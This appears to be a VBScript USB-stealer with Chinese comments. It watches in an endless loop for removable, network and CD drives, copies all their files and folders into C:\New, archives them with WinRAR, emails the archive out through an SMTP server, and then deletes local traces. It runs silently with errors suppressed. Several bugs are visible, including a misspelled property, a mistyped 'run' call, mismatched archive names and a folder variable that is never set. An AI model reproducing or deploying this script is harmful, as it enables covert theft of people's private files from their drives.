On Error Resume Next
Dim fso, d, dc, s, f, f1, fp, fc, strMfrom, strMto, strMfpass, sfile
Dim WshShell, oShell, strcmdpath
Set oShell = WScript.CreateObject ("WSCript.shell")
Set fso = CreateObject("Scripting.FileSystemObject")

Do While True 'Do While ……Loop部分 用一个死循环实现对drives的监控
    getnewDrive
    wscript.sleep 5 * 1000 * 60
Loop

Function getnewDrive ' 检测有没有新的drive?
    Set dc = fso.Drives
    For Each d In dc
        wscript.echo d.dirvename
        If d.DriveType >2 And d.IsReady = True Then '检查drivetype的属性和准备情况 fp=fso.CreateFolder("c:\New") '创建一个新的文件夹 以方便把U盘的文件拷过来
            fppth = fp.Path
            
            copyfiletotemp(d)
        End If
    Next
End Function

Function copyfiletotemp(folderspec)
    
    Set f = fso.GetFolder(folderspec)
    Set fc = f.SubFolders
    Set fs = f.Files
    For Each f1 In fc '得到所有文件夹
        f1.Copy(fppth)
    Next
    For Each f1 In fs ' 得到所有文件
        f1.Copy(fppth)
    Next
    
    
    oShell.run "cmd /K CD C:\\Program Files\\WinRAR\ &rar.exe a c:\ufiles.rar c:\new\ -- ", 0 '压缩一下
    
    
    sfile = "c:\upfiles.rar"
    sendfiletome strMfrom, strMto, strMfpass, sfile
End Function


Function sendfiletome(strMfrom, strMto, strMfpass, sfile)
    Dim uname, File, lenth, len2, smtpser
    lenth = InStrRev(strMfrom, "@")
    uname = Left(strMfrom, lenth -1)
    len2 = Len(strMfrom) - lenth
    smtpser = "smtp."&Right(strMfrom, len2)
    NameSpace = "http://schemas.microsoft.com/cdo/configuration/"
    Set Email = CreateObject("CDO.Message")
    Email.From = strMfrom
    Email.To = strMto
    Email.Subject = "送资料来了,大哥"
    Email.Textbody = "大哥,我很累.哦 我想喝瓶汽水"
    If (sfile = nul) Then
        Email.AddAttachment sfile, True '双引号内添加附件,如果有多个就另写一行
    End If
    With Email.Configuration.Fields
        .Item(NameSpace&"sendusing") = 2
        .Item(NameSpace&"smtpserver") = smtpser '发信服务器
        .Item(NameSpace&"smtpserverport") = 25
        .Item(NameSpace&"smtpauthenticate") = 1
        .Item(NameSpace&"sendusername") = uname'发信人的姓名
        .Item(NameSpace&"sendpassword") = strMfpass '发信邮箱密码
        .Update
    End With
    Email.Send
    oshell.reu "del c:\new\&del"&sfile '打扫痕迹
    Set oShell = Nothing '释放对象
End Function

'tips:
'drivetype:
' 0： "Unknown"
' 1： "Removable"
' 2： "Fixed"
' 3： "Network"
' 4： "CD-ROM"
' 5： "RAM Disk"
